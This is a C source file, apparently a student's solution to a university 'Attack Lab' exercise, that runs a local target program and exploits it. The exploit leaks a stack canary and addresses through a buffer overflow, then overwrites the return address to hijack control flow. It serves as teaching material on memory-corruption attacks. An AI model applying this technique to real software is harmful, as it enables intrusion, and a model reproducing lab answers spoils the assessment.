/* 
 * PKU-ICS: Attack Lab X
 * 
 * <Please put your name and userid here>
 * 
 * handin.c - Source file with your solutions to the Lab.
 *            This is the file you will hand in to your instructor.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/wait.h>

static int exploit(FILE *rfile, FILE *wfile)
{
  // Here is a demo on how to interact with the program:
  
  char buffer[0x300];

  fgets(buffer, 0x300, rfile);
  printf("Recive from target program: %s\n", buffer);
  memset(buffer, 0  , 0x300);
  memset(buffer, 'a'  , 0xf8);
  buffer[0xf8] = '-';
  buffer[0xf9] = '1';
  buffer[0xfa] = '\n';
  printf("%d\n",strlen(buffer));
  fwrite(buffer, 0xfa + 1, 1, wfile);
  fflush(wfile);

  fgets(buffer, 0x200, rfile);
  int l = strlen(buffer);
  while (1){
        if (l >= 0xf8 + 0x6 + 0x8 + 0x6) break;
	printf("%d\n",strlen(buffer));
        fgets(buffer + l, 0x200, rfile);
        l = strlen(buffer);
  }
  buffer[0xf8 + 0x6] = 0;
  //printf("Recive from target program: %s\n", buffer);
  char canary[0x30];
  char stack[0x30];
  memset(canary, 0, 0x10);
  memset(stack, 0, 0x10);
  for (int i = 0x1 ; i < 0x8; i++)
	canary[i] = buffer[i + 0xf8 + 0x6];
  for (int i = 0x0 ; i < 0x6; i++)
	stack[i] = buffer[i + 0xf8 + 0x6 + 0x8];
  printf("canary from target program: ");
  for (int i = 0x0 ; i < 0x8; i++)
	printf("%02x#",((int)canary[i]) & 0xff);
  puts("");
  printf("stack from target program: ");
  for (int i = 0x0 ; i < 0x8; i++)
	printf("%02x#",((int)stack[i]) & 0xff);
  puts("");
  // get the Canary 
  
  fgets(buffer, 0x200, rfile);
  // length of story
  //printf("Recive from target program: %s\n", buffer);
  memset(buffer, 0, 0x300);
  memset(buffer, 'a', 0xf9);
  for (int i = 0x1; i < 0x8; i++)
	buffer[0xf8 + i] = canary[i];
  fwrite(buffer, 0x100, 1, wfile);
  fflush(wfile);

  fgets(buffer, 0x200, rfile);
  //printf("Recive from target program: %s\n", buffer);
  //down to business

  memset(buffer, 0, 0x300);
  memset(buffer, 'a', 0x7);
  buffer[0x7] = '\n';
  fwrite(buffer, 0x8, 1, wfile);
  fflush(wfile);

  fgets(buffer, 0x200, rfile);
  fflush(stdout);
  //printf("Recive from target program: %s\n", buffer);
  // empty line
  
  
  memset(buffer, 0, 0x300);
  l = strlen(buffer);
  while (1){
        if (l >= 0xf8 + 0x6 + 0x8 + 0x6) break;
	printf("%d\n",strlen(buffer));
        fgets(buffer + l, 0x200, rfile);
        l = strlen(buffer);
  }
  printf("return value from target program: ");
  for (int i = 0x0 ; i < 0x8; i++)
	printf("%02x#",((int)buffer[i + 0x108]) & 0xff);
  puts("");

  char retplace[0x30];
  memset(retplace, 0, 0x10);
  for (int i = 0x0 ; i < 0x8; i++)
	retplace[i] = buffer[i + 0x108];
  retplace[0] = 0x29;
  retplace[1] = retplace[1] - 0x4 + 0x2;

  printf("insert value to target program: ");
  for (int i = 0x0 ; i < 0x8; i++)
	printf("%02x#",((int)retplace[i]) & 0xff);
  puts("");

  memset(buffer, 0, 0x300);
  memset(buffer, 'a', 0x100);
  for (int i = 0x0; i < 0x8; i++)
	buffer[0xf8 + i] = canary[i];
  for (int i = 0x0; i < 0x6; i++)
	buffer[0x100 + i] = stack[i];
  for (int i = 0x0; i < 0x6; i++)
	buffer[0x108 + i] = retplace[i];
  buffer[0x110] = '\n';
  
  printf("Hack string: %s\n",buffer);
  for (int i = 0xf0; i < 0x110; i++)
	printf("%02x#",((int)buffer[i]) & 0xff);
  puts("");
  fwrite(buffer, 0x111, 1, wfile);
  fflush(wfile);


  fgets(buffer, 0x100, rfile);
  fflush(stdout);
  printf("Recive from target program: %s\n", buffer);


  fgets(buffer, 0x100, rfile);
  fflush(stdout);
  printf("Recive from target program: %s\n", buffer);



  fgets(buffer, 0x100, rfile);
  fflush(stdout);
  printf("Recive from target program: %s\n", buffer);

  return 0;
}

static pid_t spawn(const char *program, FILE **rfile, FILE **wfile)
{
  int rpipes[2]; // (parent rfile, child stdout)
  int wpipes[2]; // (child stdin, parent wfile)
  pid_t pid;
  
  if (pipe(rpipes) < 0) {
    perror("pipe");
    goto rpipe_err;
  }

  if (pipe(wpipes) < 0) {
    perror("pipe");
    goto wpipe_err;
  }

  pid = fork();
  if (pid < 0) {
    perror("fork");
    goto fork_err;
  } else if (pid == 0) {
    // Execute `./secret` in the child process
    close(rpipes[0]);
    close(wpipes[1]);
    if (dup2(rpipes[1], 1) < 0) {
      perror("dup2");
      exit(-1);
    }
    if (dup2(wpipes[0], 0) < 0) {
      perror("dup2");
      exit(-1);
    }
    close(rpipes[1]);
    close(wpipes[0]);

    execlp("sh", "sh", "-c", program, NULL);
    perror("execlp");
    exit(-1);
  }

  // parent use rpipes[0] as input
  //            wpipes[1] as output
  close(rpipes[1]);
  close(wpipes[0]);
  *rfile = fdopen(rpipes[0], "r");
  *wfile = fdopen(wpipes[1], "w");
  return pid;

fork_err:
  close(wpipes[0]);
  close(wpipes[1]);
wpipe_err:
  close(rpipes[0]);
  close(rpipes[1]);
rpipe_err:
  return -1;
}

struct piped_fps
{
  FILE *in_fp;
  FILE *out_fp;
};

static void *pipe_fp(void *priv)
{
  struct piped_fps fps = *(struct piped_fps *)priv;
  size_t nbuf;
  ssize_t nbytes;
  char *buffer = NULL;

  for (;;)
  {
    nbuf = 0;
    if ((nbytes = getline(&buffer, &nbuf, fps.in_fp)) < 0)
      break;

    nbytes = fwrite(buffer, 1, nbytes, fps.out_fp);
    if (nbytes == 0)
      break;
    fflush(fps.out_fp);

    free(buffer);
    buffer = NULL;
  }

  if (buffer)
    free(buffer);
  fclose(fps.in_fp);
  fclose(fps.out_fp);
  return NULL;
}

static void forward(FILE *rfile, FILE *wfile)
{
  struct piped_fps fps1 = {
    .in_fp = stdin,
    .out_fp = wfile,
  };
  struct piped_fps fps2 = {
    .in_fp = rfile,
    .out_fp = stdout,
  };
  pthread_t th1, th2;

  pthread_create(&th1, NULL, &pipe_fp, &fps1);
  pthread_create(&th2, NULL, &pipe_fp, &fps2);

  pthread_join(th1, NULL);
  pthread_join(th2, NULL);
}

int main(void)
{
  FILE *rfile, *wfile;
  pid_t pid;

  pid = spawn("./secret", &rfile, &wfile);
  if (pid < 0)
    return -1;
  fprintf(stderr, "spawn pid=%d\n", pid);

  fprintf(stderr, "Press <Enter> to continue...\n");
  getchar();

  if (exploit(rfile, wfile) < 0) {
    fputs("exploit failed\n", stderr);
    kill(pid, SIGINT);
  } else {
    fputs("exploit ok\n", stderr);
    forward(rfile, wfile);
  }

  if (waitpid(pid, NULL, 0) != pid)
    perror("waitpid");

  return 0;
}
